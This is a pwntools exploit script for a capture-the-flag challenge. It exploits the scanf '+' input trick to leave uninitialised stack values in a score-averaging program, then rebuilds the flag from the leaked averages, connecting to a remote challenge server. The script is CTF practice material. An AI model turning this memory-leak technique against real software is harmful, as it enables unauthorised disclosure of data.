#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '0.cloud.chals.io', 10198

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io

    flag = ''

    idx = 4
    for i in range(0, 20-idx):
        io = initialize()

        for i in range(0, 20):
            if i == idx:
                io.sendlineafter(b':', b'+')
            else:
                io.sendlineafter(b':', b'0')
        io.recvuntil(b'Average score is ')
        
        try:
            leak = hex(int(float(io.recvline().strip()[:-1]) * 20))
            flag += bytearray.fromhex(leak[2:])[::-1].decode()
        except:   
            pass

        idx += 1
        io.close()
    
    log.success(f'Flag: {flag}')
    
if __name__ == '__main__':
    exploit()